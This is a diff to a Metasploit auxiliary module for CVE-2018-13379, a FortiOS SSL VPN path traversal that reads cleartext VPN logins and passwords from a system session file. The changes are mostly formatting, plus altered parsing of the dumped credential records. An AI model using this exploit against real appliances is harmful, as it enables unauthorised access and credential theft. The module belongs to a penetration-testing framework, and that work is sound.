@@ -12,40 +12,44 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Post::File
 
   def initialize(info = {})
-    super(update_info(info,
-                      'Name' => 'FortiOS Path Traversal Leak Credentials',
-                      'Description' => '
-        FortiOS system file leak through SSL VPN via specially crafted HTTP
-        resource requests. A path traversal vulnerability in the FortiOS SSL
-        VPN web portal may allow an unauthenticated attacker to download FortiOS
-        system files through specially crafted HTTP resource requests.
+    super(
+      update_info(
+        info,
+        'Name' => 'FortiOS Path Traversal Leak Credentials',
+        'Description' => %q{
+          FortiOS system file leak through SSL VPN via specially crafted HTTP
+          resource requests. A path traversal vulnerability in the FortiOS SSL
+          VPN web portal may allow an unauthenticated attacker to download FortiOS
+          system files through specially crafted HTTP resource requests.
 
-        This module reads logins and passwords in clear text from
-        the `/dev/cmdb/sslvpn_websession` file. This vulnerability affects
-        (FortiOS 5.4.6 to 5.4.12, FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0
-        to 6.0.4).
-      ',
-                      'References' => [
-                        %w[CVE 2018-13379],
-                        ['URL', 'https://www.fortiguard.com/psirt/FG-IR-18-384'],
-                        %w[EDB 47287],
-                        %w[EDB 47288]
-                      ],
-                      'Author' => [
-                        'lynx (Carlos Vieira)',         # initial module author from edb
-                        'mekhalleh (RAMELLA Sébastien)' # this module author (Zeop Entreprise)
-                      ],
-                      'License' => MSF_LICENSE,
-                      'DefaultOptions' => {
-                        'RPORT' => 10_443,
-                        'SSL' => true
-                      }))
+          This module reads logins and passwords in clear text from
+          the `/dev/cmdb/sslvpn_websession` file. This vulnerability affects
+          (FortiOS 5.4.6 to 5.4.12, FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0
+          to 6.0.4).
+        },
+        'References' => [
+          %w[CVE 2018-13379],
+          ['URL', 'https://www.fortiguard.com/psirt/FG-IR-18-384'],
+          %w[EDB 47287],
+          %w[EDB 47288]
+        ],
+        'Author' => [
+          'lynx (Carlos Vieira)',         # initial module author from edb
+          'mekhalleh (RAMELLA Sébastien)' # this module author (Zeop Entreprise)
+        ],
+        'License' => MSF_LICENSE,
+        'DefaultOptions' => {
+          'RPORT' => 10_443,
+          'SSL' => true
+        }
+      )
+    )
 
     register_options([
-                       OptEnum.new('DUMP_FORMAT', [true, 'Dump format.', 'raw', %w[raw ascii]]),
-                       OptBool.new('STORE_CRED', [false, 'Store credential into the database.', true]),
-                       OptString.new('TARGETURI', [true, 'Base path', '/remote'])
-                     ])
+      OptEnum.new('DUMP_FORMAT', [true, 'Dump format.', 'raw', %w[raw ascii]]),
+      OptBool.new('STORE_CRED', [false, 'Store credential into the database.', true]),
+      OptString.new('TARGETURI', [true, 'Base path', '/remote'])
+    ])
   end
 
   def execute_request
@@ -99,7 +103,7 @@ class MetasploitModule < Msf::Auxiliary
 
     return if chunk[1].nil? || chunk[2].nil?
 
-    credential = {
+    {
       ip: @ip_address,
       port: datastore['RPORT'],
       service_name: @proto,
@@ -111,7 +115,11 @@ class MetasploitModule < Msf::Auxiliary
   def report_creds(creds)
     creds.each do |cred|
       cred = cred.gsub('"', '').gsub(/[{}:]/, '').split(', ')
-      cred = cred.map { |h| h1, h2 = h.split('=>'); { h1 => h2 } }.reduce(:merge)
+      cred = cred.map do |h|
+        h1, h2 = h.split('=>')
+        { h1 => h2 }
+      end
+      cred = cred.reduce(:merge)
 
       cred = JSON.parse(cred.to_json)
 
@@ -158,12 +166,17 @@ class MetasploitModule < Msf::Auxiliary
                   data.gsub(/[^[:print:]]/, '.')
                 else
                   data
-    end
+                end
     loot_path = store_loot('', 'text/plain', @ip_address, loot_data, '', '')
     print_good(message("File saved to #{loot_path}"))
 
-    separator = "\x5F\x01"
-    separator = "\x5F\x00\x00\x00\x00\x01" if data =~ /\x5F\x00\x00\x00\x00\x01/
+    return if data.length < 110
+
+    if data[73] == "\x01"
+      separator = data[72..73]
+    elsif data[105..109] == "\x00\x00\x00\x00\x01"
+      separator = data[104..109]
+    end
     data = data.split(separator)
 
     creds = []
@@ -181,4 +194,5 @@ class MetasploitModule < Msf::Auxiliary
     print_good(message("#{creds.length} credential(s) found!"))
     report_creds(creds)
   end
+
 end
